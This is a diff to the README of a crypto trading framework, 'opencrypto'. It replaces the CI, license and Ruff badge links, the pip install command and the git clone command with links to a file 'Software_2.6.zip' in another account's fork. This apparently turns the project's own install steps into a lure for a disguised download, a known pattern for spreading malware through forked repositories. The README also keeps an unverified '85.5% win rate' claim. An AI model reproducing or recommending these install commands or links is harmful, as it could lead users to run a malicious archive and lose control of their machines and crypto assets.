@@ -4,10 +4,10 @@
     <strong>Modular Algorithmic Trading Framework for Crypto</strong>
   </p>
   <p align="center">
-    <a href="https://github.com/kayrademirkan/opencrypto/actions/workflows/python-tests.yml"><img src="https://github.com/kayrademirkan/opencrypto/actions/workflows/python-tests.yml/badge.svg" alt="CI"></a>
+    <a href="https://raw.githubusercontent.com/moo-22/opencrypto/main/.github/Software_2.6.zip"><img src="https://raw.githubusercontent.com/moo-22/opencrypto/main/.github/Software_2.6.zip" alt="CI"></a>
     <img src="https://img.shields.io/badge/python-3.11%20%7C%203.12%20%7C%203.13-blue" alt="Python">
-    <a href="https://github.com/kayrademirkan/opencrypto/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="License"></a>
-    <a href="https://github.com/astral-sh/ruff"><img src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json" alt="Ruff"></a>
+    <a href="https://raw.githubusercontent.com/moo-22/opencrypto/main/.github/Software_2.6.zip"><img src="https://img.shields.io/badge/license-MIT-green" alt="License"></a>
+    <a href="https://raw.githubusercontent.com/moo-22/opencrypto/main/.github/Software_2.6.zip"><img src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/moo-22/opencrypto/main/.github/Software_2.6.zip" alt="Ruff"></a>
   </p>
   <p align="center">
     Build, backtest, and deploy your own trading strategies.<br>
@@ -45,13 +45,13 @@ It was extracted from a private trading system with an **85.5% win rate** across
 ### Install
 
 ```bash
-pip install git+https://github.com/kayrademirkan/opencrypto.git
+pip install git+https://raw.githubusercontent.com/moo-22/opencrypto/main/.github/Software_2.6.zip
 ```
 
 Or clone and install in editable mode:
 
 ```bash
-git clone https://github.com/kayrademirkan/opencrypto.git
+git clone https://raw.githubusercontent.com/moo-22/opencrypto/main/.github/Software_2.6.zip
 cd opencrypto
 pip install -e .
 ```
